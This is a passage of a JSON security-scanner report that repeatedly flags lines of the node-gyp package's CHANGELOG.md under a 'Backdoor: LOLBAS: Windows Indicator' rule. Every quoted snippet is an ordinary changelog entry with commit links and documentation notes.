                      "markdown": "`/pull/2063)\n\n## v5.1.0 2020-02-05\n\n* [[`f37a8b40d0`](https://github.com/nodejs/node-gyp/commit/f37a8b40d0)] - **doc**: add GitHub Actions badge (#1994) (Rod Vagg) [#1994](https://github.com/nodejs/node-gyp/pull/1994)\n* [[`cb3f6aae5e`](https://github.com/nodejs/node-gyp/commit/cb3f6aae5e)] - **doc**: update macOS\\_Catalina.md (#1992) (James Home) [#1992](https://github.com/nodejs/node-gyp/pull/1992)\n* [[`0607596a4c`](https://github.com/nodejs/node-gyp/commit/0607596a4c)] - **doc**: fix typo in README.md (#1985) (Suraneti Rodsuwan) [#1985](https://github.com/nodejs/node-gyp/pull/1985)\n* [[`0d5a415a14`](`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 595,
                  "startColumn": 83,
                  "endLine": 595,
                  "endColumn": 91,
                  "snippet": {
                    "text": "`bb8d0e7b10`](https://github.com/nodejs/node-gyp/commit/bb8d0e7b10)] - **doc**: Catalina suggestion: remove /Library/Developer/CommandLineTools (Christian Clauss) [#2022](https://github.com/nodejs/node-gyp/pull/2022)\n* [[`fb2e80d4e3`](https://github.com/nodejs/node-gyp/commit/fb2e80d4e3)] - **doc**: update link to the code of conduct (#2073) (Michaël Zasso) [#2073](https://github.com/nodejs/node-gyp/pull/2073)\n* [[`251d9c885c`](https://github.com/nodejs/node-gyp/commit/251d9c885c)] - **doc**: note in README that Python 3.8 is supported (#2072) (Michaël Zasso) [#2072](https://github.com/nodejs/node-gyp",
                    "rendered": {
                      "text": "`bb8d0e7b10`](https://github.com/nodejs/node-gyp/commit/bb8d0e7b10)] - **doc**: Catalina suggestion: remove /Library/Developer/CommandLineTools (Christian Clauss) [#2022](https://github.com/nodejs/node-gyp/pull/2022)\n* [[`fb2e80d4e3`](https://github.com/nodejs/node-gyp/commit/fb2e80d4e3)] - **doc**: update link to the code of conduct (#2073) (Michaël Zasso) [#2073](https://github.com/nodejs/node-gyp/pull/2073)\n* [[`251d9c885c`](https://github.com/nodejs/node-gyp/commit/251d9c885c)] - **doc**: note in README that Python 3.8 is supported (#2072) (Michaël Zasso) [#2072](https://github.com/nodejs/node-gyp",
                      "markdown": "``bb8d0e7b10`](https://github.com/nodejs/node-gyp/commit/bb8d0e7b10)] - **doc**: Catalina suggestion: remove /Library/Developer/CommandLineTools (Christian Clauss) [#2022](https://github.com/nodejs/node-gyp/pull/2022)\n* [[`fb2e80d4e3`](https://github.com/nodejs/node-gyp/commit/fb2e80d4e3)] - **doc**: update link to the code of conduct (#2073) (Michaël Zasso) [#2073](https://github.com/nodejs/node-gyp/pull/2073)\n* [[`251d9c885c`](https://github.com/nodejs/node-gyp/commit/251d9c885c)] - **doc**: note in README that Python 3.8 is supported (#2072) (Michaël Zasso) [#2072](https://github.com/nodejs/node-gyp`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 592,
                  "startColumn": 83,
                  "endLine": 592,
                  "endColumn": 91,
                  "snippet": {
                    "text": "l/2078)\n* [[`c106d915f5`](https://github.com/nodejs/node-gyp/commit/c106d915f5)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`9a6fea92e2`](https://github.com/nodejs/node-gyp/commit/9a6fea92e2)] - **doc**: update catalina xcode cli tools download link; formatting (Jonathan Hult) [#2034](https://github.com/nodejs/node-gyp/pull/2034)\n* [[`59b0b1add8`](https://github.com/nodejs/node-gyp/commit/59b0b1add8)] - **doc**: add download link for Command Line Tools for Xcode (Przemysław Bitkowski) [#2029](https://githu",
                    "rendered": {
                      "text": "l/2078)\n* [[`c106d915f5`](https://github.com/nodejs/node-gyp/commit/c106d915f5)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`9a6fea92e2`](https://github.com/nodejs/node-gyp/commit/9a6fea92e2)] - **doc**: update catalina xcode cli tools download link; formatting (Jonathan Hult) [#2034](https://github.com/nodejs/node-gyp/pull/2034)\n* [[`59b0b1add8`](https://github.com/nodejs/node-gyp/commit/59b0b1add8)] - **doc**: add download link for Command Line Tools for Xcode (Przemysław Bitkowski) [#2029](https://githu",
                      "markdown": "`l/2078)\n* [[`c106d915f5`](https://github.com/nodejs/node-gyp/commit/c106d915f5)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`9a6fea92e2`](https://github.com/nodejs/node-gyp/commit/9a6fea92e2)] - **doc**: update catalina xcode cli tools download link; formatting (Jonathan Hult) [#2034](https://github.com/nodejs/node-gyp/pull/2034)\n* [[`59b0b1add8`](https://github.com/nodejs/node-gyp/commit/59b0b1add8)] - **doc**: add download link for Command Line Tools for Xcode (Przemysław Bitkowski) [#2029](https://githu`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 591,
                  "startColumn": 83,
                  "endLine": 591,
                  "endColumn": 91,
                  "snippet": {
                    "text": "odejs/node-gyp/pull/2060)\n* [[`1f2ba75bc0`](https://github.com/nodejs/node-gyp/commit/1f2ba75bc0)] - **doc**: add macOS Catalina software update info (Karl Horky) [#2078](https://github.com/nodejs/node-gyp/pull/2078)\n* [[`c106d915f5`](https://github.com/nodejs/node-gyp/commit/c106d915f5)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`9a6fea92e2`](https://github.com/nodejs/node-gyp/commit/9a6fea92e2)] - **doc**: update catalina xcode cli tools download link; formatting (Jonathan Hult) [#2034](https://github.c",
                    "rendered": {
                      "text": "odejs/node-gyp/pull/2060)\n* [[`1f2ba75bc0`](https://github.com/nodejs/node-gyp/commit/1f2ba75bc0)] - **doc**: add macOS Catalina software update info (Karl Horky) [#2078](https://github.com/nodejs/node-gyp/pull/2078)\n* [[`c106d915f5`](https://github.com/nodejs/node-gyp/commit/c106d915f5)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`9a6fea92e2`](https://github.com/nodejs/node-gyp/commit/9a6fea92e2)] - **doc**: update catalina xcode cli tools download link; formatting (Jonathan Hult) [#2034](https://github.c",
                      "markdown": "`odejs/node-gyp/pull/2060)\n* [[`1f2ba75bc0`](https://github.com/nodejs/node-gyp/commit/1f2ba75bc0)] - **doc**: add macOS Catalina software update info (Karl Horky) [#2078](https://github.com/nodejs/node-gyp/pull/2078)\n* [[`c106d915f5`](https://github.com/nodejs/node-gyp/commit/c106d915f5)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`9a6fea92e2`](https://github.com/nodejs/node-gyp/commit/9a6fea92e2)] - **doc**: update catalina xcode cli tools download link; formatting (Jonathan Hult) [#2034](https://github.c`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 590,
                  "startColumn": 111,
                  "endLine": 590,
                  "endColumn": 119,
                  "snippet": {
                    "text": "d3a79abe`](https://github.com/nodejs/node-gyp/commit/bdd3a79abe)] - **build**: shrink bloated addon binaries on windows (Shelley Vohr) [#2060](https://github.com/nodejs/node-gyp/pull/2060)\n* [[`1f2ba75bc0`](https://github.com/nodejs/node-gyp/commit/1f2ba75bc0)] - **doc**: add macOS Catalina software update info (Karl Horky) [#2078](https://github.com/nodejs/node-gyp/pull/2078)\n* [[`c106d915f5`](https://github.com/nodejs/node-gyp/commit/c106d915f5)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`9a6fea92e2`](h",
                    "rendered": {
                      "text": "d3a79abe`](https://github.com/nodejs/node-gyp/commit/bdd3a79abe)] - **build**: shrink bloated addon binaries on windows (Shelley Vohr) [#2060](https://github.com/nodejs/node-gyp/pull/2060)\n* [[`1f2ba75bc0`](https://github.com/nodejs/node-gyp/commit/1f2ba75bc0)] - **doc**: add macOS Catalina software update info (Karl Horky) [#2078](https://github.com/nodejs/node-gyp/pull/2078)\n* [[`c106d915f5`](https://github.com/nodejs/node-gyp/commit/c106d915f5)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`9a6fea92e2`](h",
                      "markdown": "`d3a79abe`](https://github.com/nodejs/node-gyp/commit/bdd3a79abe)] - **build**: shrink bloated addon binaries on windows (Shelley Vohr) [#2060](https://github.com/nodejs/node-gyp/pull/2060)\n* [[`1f2ba75bc0`](https://github.com/nodejs/node-gyp/commit/1f2ba75bc0)] - **doc**: add macOS Catalina software update info (Karl Horky) [#2078](https://github.com/nodejs/node-gyp/pull/2078)\n* [[`c106d915f5`](https://github.com/nodejs/node-gyp/commit/c106d915f5)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`9a6fea92e2`](h`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 574,
                  "startColumn": 120,
                  "endLine": 574,
                  "endColumn": 128,
                  "snippet": {
                    "text": "7b6`](https://github.com/nodejs/node-gyp/commit/3538a317b6)] - **doc**: adjustments to the README.md for new users (Dan Pike) [#1919](https://github.com/nodejs/node-gyp/pull/1919)\n* [[`4fff8458c0`](https://github.com/nodejs/node-gyp/commit/4fff8458c0)] - **travis**: ignore failed `brew upgrade npm`, update xcode (Christian Clauss) [#1932](https://github.com/nodejs/node-gyp/pull/1932)\n* [[`60e4488f08`](https://github.com/nodejs/node-gyp/commit/60e4488f08)] - **build**: avoid bare exceptions in xcode\\_emulation.py (Christian Clauss) [#1932](https://github.com/nodejs/node-gyp/pull/1932)\n* [[`032db2a2d0`]",
                    "rendered": {
                      "text": "7b6`](https://github.com/nodejs/node-gyp/commit/3538a317b6)] - **doc**: adjustments to the README.md for new users (Dan Pike) [#1919](https://github.com/nodejs/node-gyp/pull/1919)\n* [[`4fff8458c0`](https://github.com/nodejs/node-gyp/commit/4fff8458c0)] - **travis**: ignore failed `brew upgrade npm`, update xcode (Christian Clauss) [#1932](https://github.com/nodejs/node-gyp/pull/1932)\n* [[`60e4488f08`](https://github.com/nodejs/node-gyp/commit/60e4488f08)] - **build**: avoid bare exceptions in xcode\\_emulation.py (Christian Clauss) [#1932](https://github.com/nodejs/node-gyp/pull/1932)\n* [[`032db2a2d0`]",
                      "markdown": "`7b6`](https://github.com/nodejs/node-gyp/commit/3538a317b6)] - **doc**: adjustments to the README.md for new users (Dan Pike) [#1919](https://github.com/nodejs/node-gyp/pull/1919)\n* [[`4fff8458c0`](https://github.com/nodejs/node-gyp/commit/4fff8458c0)] - **travis**: ignore failed `brew upgrade npm`, update xcode (Christian Clauss) [#1932](https://github.com/nodejs/node-gyp/pull/1932)\n* [[`60e4488f08`](https://github.com/nodejs/node-gyp/commit/60e4488f08)] - **build**: avoid bare exceptions in xcode\\_emulation.py (Christian Clauss) [#1932](https://github.com/nodejs/node-gyp/pull/1932)\n* [[`032db2a2d0`]`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 571,
                  "startColumn": 84,
                  "endLine": 571,
                  "endColumn": 92,
                  "snippet": {
                    "text": "ejs/node-gyp/pull/1937)\n* [[`f0693413d9`](https://github.com/nodejs/node-gyp/commit/f0693413d9)] - **src,win**: allow 403 errors for arm64 node.lib (Richard Lau) [#1934](https://github.com/nodejs/node-gyp/pull/1934)\n* [[`c60c22de58`](https://github.com/nodejs/node-gyp/commit/c60c22de58)] - **deps**: update deps to roughly match current npm@6 (Rod Vagg) [#1920](https://github.com/nodejs/node-gyp/pull/1920)\n* [[`b91718eefc`](https://github.com/nodejs/node-gyp/commit/b91718eefc)] - **test**: upgrade Linux Travis CI to Python 3.8 (Christian Clauss) [#1923](https://github.com/nodejs/node-gyp/pull/1923)\n* [",
                    "rendered": {
                      "text": "ejs/node-gyp/pull/1937)\n* [[`f0693413d9`](https://github.com/nodejs/node-gyp/commit/f0693413d9)] - **src,win**: allow 403 errors for arm64 node.lib (Richard Lau) [#1934](https://github.com/nodejs/node-gyp/pull/1934)\n* [[`c60c22de58`](https://github.com/nodejs/node-gyp/commit/c60c22de58)] - **deps**: update deps to roughly match current npm@6 (Rod Vagg) [#1920](https://github.com/nodejs/node-gyp/pull/1920)\n* [[`b91718eefc`](https://github.com/nodejs/node-gyp/commit/b91718eefc)] - **test**: upgrade Linux Travis CI to Python 3.8 (Christian Clauss) [#1923](https://github.com/nodejs/node-gyp/pull/1923)\n* [",
                      "markdown": "`ejs/node-gyp/pull/1937)\n* [[`f0693413d9`](https://github.com/nodejs/node-gyp/commit/f0693413d9)] - **src,win**: allow 403 errors for arm64 node.lib (Richard Lau) [#1934](https://github.com/nodejs/node-gyp/pull/1934)\n* [[`c60c22de58`](https://github.com/nodejs/node-gyp/commit/c60c22de58)] - **deps**: update deps to roughly match current npm@6 (Rod Vagg) [#1920](https://github.com/nodejs/node-gyp/pull/1920)\n* [[`b91718eefc`](https://github.com/nodejs/node-gyp/commit/b91718eefc)] - **test**: upgrade Linux Travis CI to Python 3.8 (Christian Clauss) [#1923](https://github.com/nodejs/node-gyp/pull/1923)\n* [`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 545,
                  "startColumn": 83,
                  "endLine": 545,
                  "endColumn": 91,
                  "snippet": {
                    "text": "hub.com/nodejs/node-gyp/pull/2011)\n* [[`26cd6eaea6`](https://github.com/nodejs/node-gyp/commit/26cd6eaea6)] - **doc**: add GitHub Actions badge (#1994) (Rod Vagg) [#1994](https://github.com/nodejs/node-gyp/pull/1994)\n* [[`312c12ef4f`](https://github.com/nodejs/node-gyp/commit/312c12ef4f)] - **doc**: update macOS\\_Catalina.md (#1992) (James Home) [#1992](https://github.com/nodejs/node-gyp/pull/1992)\n* [[`f7b6b6b77b`](https://github.com/nodejs/node-gyp/commit/f7b6b6b77b)] - **doc**: fix typo in README.md (#1985) (Suraneti Rodsuwan) [#1985](https://github.com/nodejs/node-gyp/pull/1985)\n* [[`6b8f2652dd`](",
                    "rendered": {
                      "text": "hub.com/nodejs/node-gyp/pull/2011)\n* [[`26cd6eaea6`](https://github.com/nodejs/node-gyp/commit/26cd6eaea6)] - **doc**: add GitHub Actions badge (#1994) (Rod Vagg) [#1994](https://github.com/nodejs/node-gyp/pull/1994)\n* [[`312c12ef4f`](https://github.com/nodejs/node-gyp/commit/312c12ef4f)] - **doc**: update macOS\\_Catalina.md (#1992) (James Home) [#1992](https://github.com/nodejs/node-gyp/pull/1992)\n* [[`f7b6b6b77b`](https://github.com/nodejs/node-gyp/commit/f7b6b6b77b)] - **doc**: fix typo in README.md (#1985) (Suraneti Rodsuwan) [#1985](https://github.com/nodejs/node-gyp/pull/1985)\n* [[`6b8f2652dd`](",
                      "markdown": "`hub.com/nodejs/node-gyp/pull/2011)\n* [[`26cd6eaea6`](https://github.com/nodejs/node-gyp/commit/26cd6eaea6)] - **doc**: add GitHub Actions badge (#1994) (Rod Vagg) [#1994](https://github.com/nodejs/node-gyp/pull/1994)\n* [[`312c12ef4f`](https://github.com/nodejs/node-gyp/commit/312c12ef4f)] - **doc**: update macOS\\_Catalina.md (#1992) (James Home) [#1992](https://github.com/nodejs/node-gyp/pull/1992)\n* [[`f7b6b6b77b`](https://github.com/nodejs/node-gyp/commit/f7b6b6b77b)] - **doc**: fix typo in README.md (#1985) (Suraneti Rodsuwan) [#1985](https://github.com/nodejs/node-gyp/pull/1985)\n* [[`6b8f2652dd`](`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 534,
                  "startColumn": 83,
                  "endLine": 534,
                  "endColumn": 91,
                  "snippet": {
                    "text": "ps://github.com/nodejs/node-gyp/pull/2096)\n* [[`a6b76a8b48`](https://github.com/nodejs/node-gyp/commit/a6b76a8b48)] - **gyp**: update gyp to 0.2.1 (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`ebc34ec823`](https://github.com/nodejs/node-gyp/commit/ebc34ec823)] - **gyp**: update gyp to 0.2.0 (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`972780bde7`](https://github.com/nodejs/node-gyp/commit/972780bde7)] - **(SEMVER-MAJOR)** **gyp**: sync code base with nodejs repo (#1975) (Michaël Zasso) [#1975](https://github.com/nodejs/node-gyp/pull/1975)\n* [[",
                    "rendered": {
                      "text": "ps://github.com/nodejs/node-gyp/pull/2096)\n* [[`a6b76a8b48`](https://github.com/nodejs/node-gyp/commit/a6b76a8b48)] - **gyp**: update gyp to 0.2.1 (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`ebc34ec823`](https://github.com/nodejs/node-gyp/commit/ebc34ec823)] - **gyp**: update gyp to 0.2.0 (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`972780bde7`](https://github.com/nodejs/node-gyp/commit/972780bde7)] - **(SEMVER-MAJOR)** **gyp**: sync code base with nodejs repo (#1975) (Michaël Zasso) [#1975](https://github.com/nodejs/node-gyp/pull/1975)\n* [[",
                      "markdown": "`ps://github.com/nodejs/node-gyp/pull/2096)\n* [[`a6b76a8b48`](https://github.com/nodejs/node-gyp/commit/a6b76a8b48)] - **gyp**: update gyp to 0.2.1 (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`ebc34ec823`](https://github.com/nodejs/node-gyp/commit/ebc34ec823)] - **gyp**: update gyp to 0.2.0 (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`972780bde7`](https://github.com/nodejs/node-gyp/commit/972780bde7)] - **(SEMVER-MAJOR)** **gyp**: sync code base with nodejs repo (#1975) (Michaël Zasso) [#1975](https://github.com/nodejs/node-gyp/pull/1975)\n* [[`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 533,
                  "startColumn": 83,
                  "endLine": 533,
                  "endColumn": 91,
                  "snippet": {
                    "text": "p/pull/2021)\n* [[`6356117b08`](https://github.com/nodejs/node-gyp/commit/6356117b08)] - **doc, bin**: stop suggesting opening  node-gyp issues (Bartosz Sosnowski) [#2096](https://github.com/nodejs/node-gyp/pull/2096)\n* [[`a6b76a8b48`](https://github.com/nodejs/node-gyp/commit/a6b76a8b48)] - **gyp**: update gyp to 0.2.1 (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`ebc34ec823`](https://github.com/nodejs/node-gyp/commit/ebc34ec823)] - **gyp**: update gyp to 0.2.0 (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`972780bde7`](https://github.com/nodejs",
                    "rendered": {
                      "text": "p/pull/2021)\n* [[`6356117b08`](https://github.com/nodejs/node-gyp/commit/6356117b08)] - **doc, bin**: stop suggesting opening  node-gyp issues (Bartosz Sosnowski) [#2096](https://github.com/nodejs/node-gyp/pull/2096)\n* [[`a6b76a8b48`](https://github.com/nodejs/node-gyp/commit/a6b76a8b48)] - **gyp**: update gyp to 0.2.1 (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`ebc34ec823`](https://github.com/nodejs/node-gyp/commit/ebc34ec823)] - **gyp**: update gyp to 0.2.0 (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`972780bde7`](https://github.com/nodejs",
                      "markdown": "`p/pull/2021)\n* [[`6356117b08`](https://github.com/nodejs/node-gyp/commit/6356117b08)] - **doc, bin**: stop suggesting opening  node-gyp issues (Bartosz Sosnowski) [#2096](https://github.com/nodejs/node-gyp/pull/2096)\n* [[`a6b76a8b48`](https://github.com/nodejs/node-gyp/commit/a6b76a8b48)] - **gyp**: update gyp to 0.2.1 (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`ebc34ec823`](https://github.com/nodejs/node-gyp/commit/ebc34ec823)] - **gyp**: update gyp to 0.2.0 (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`972780bde7`](https://github.com/nodejs`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 528,
                  "startColumn": 83,
                  "endLine": 528,
                  "endColumn": 91,
                  "snippet": {
                    "text": "l/2072)\n* [[`e7402b4a7c`](https://github.com/nodejs/node-gyp/commit/e7402b4a7c)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`35de45984f`](https://github.com/nodejs/node-gyp/commit/35de45984f)] - **doc**: update catalina xcode cli tools download link; formatting (Jonathan Hult) [#2034](https://github.com/nodejs/node-gyp/pull/2034)\n* [[`48642191f5`](https://github.com/nodejs/node-gyp/commit/48642191f5)] - **doc**: add download link for Command Line Tools for Xcode (Przemysław Bitkowski) [#2029](https://githu",
                    "rendered": {
                      "text": "l/2072)\n* [[`e7402b4a7c`](https://github.com/nodejs/node-gyp/commit/e7402b4a7c)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`35de45984f`](https://github.com/nodejs/node-gyp/commit/35de45984f)] - **doc**: update catalina xcode cli tools download link; formatting (Jonathan Hult) [#2034](https://github.com/nodejs/node-gyp/pull/2034)\n* [[`48642191f5`](https://github.com/nodejs/node-gyp/commit/48642191f5)] - **doc**: add download link for Command Line Tools for Xcode (Przemysław Bitkowski) [#2029](https://githu",
                      "markdown": "`l/2072)\n* [[`e7402b4a7c`](https://github.com/nodejs/node-gyp/commit/e7402b4a7c)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`35de45984f`](https://github.com/nodejs/node-gyp/commit/35de45984f)] - **doc**: update catalina xcode cli tools download link; formatting (Jonathan Hult) [#2034](https://github.com/nodejs/node-gyp/pull/2034)\n* [[`48642191f5`](https://github.com/nodejs/node-gyp/commit/48642191f5)] - **doc**: add download link for Command Line Tools for Xcode (Przemysław Bitkowski) [#2029](https://githu`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 527,
                  "startColumn": 83,
                  "endLine": 527,
                  "endColumn": 91,
                  "snippet": {
                    "text": "pull/2073)\n* [[`473cfa283f`](https://github.com/nodejs/node-gyp/commit/473cfa283f)] - **doc**: note in README that Python 3.8 is supported (#2072) (Michaël Zasso) [#2072](https://github.com/nodejs/node-gyp/pull/2072)\n* [[`e7402b4a7c`](https://github.com/nodejs/node-gyp/commit/e7402b4a7c)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`35de45984f`](https://github.com/nodejs/node-gyp/commit/35de45984f)] - **doc**: update catalina xcode cli tools download link; formatting (Jonathan Hult) [#2034](https://github.c",
                    "rendered": {
                      "text": "pull/2073)\n* [[`473cfa283f`](https://github.com/nodejs/node-gyp/commit/473cfa283f)] - **doc**: note in README that Python 3.8 is supported (#2072) (Michaël Zasso) [#2072](https://github.com/nodejs/node-gyp/pull/2072)\n* [[`e7402b4a7c`](https://github.com/nodejs/node-gyp/commit/e7402b4a7c)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`35de45984f`](https://github.com/nodejs/node-gyp/commit/35de45984f)] - **doc**: update catalina xcode cli tools download link; formatting (Jonathan Hult) [#2034](https://github.c",
                      "markdown": "`pull/2073)\n* [[`473cfa283f`](https://github.com/nodejs/node-gyp/commit/473cfa283f)] - **doc**: note in README that Python 3.8 is supported (#2072) (Michaël Zasso) [#2072](https://github.com/nodejs/node-gyp/pull/2072)\n* [[`e7402b4a7c`](https://github.com/nodejs/node-gyp/commit/e7402b4a7c)] - **doc**: update catalina xcode cli tools download link (#2044) (Dario Vladović) [#2044](https://github.com/nodejs/node-gyp/pull/2044)\n* [[`35de45984f`](https://github.com/nodejs/node-gyp/commit/35de45984f)] - **doc**: update catalina xcode cli tools download link; formatting (Jonathan Hult) [#2034](https://github.c`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 525,
                  "startColumn": 83,
                  "endLine": 525,
                  "endColumn": 91,
                  "snippet": {
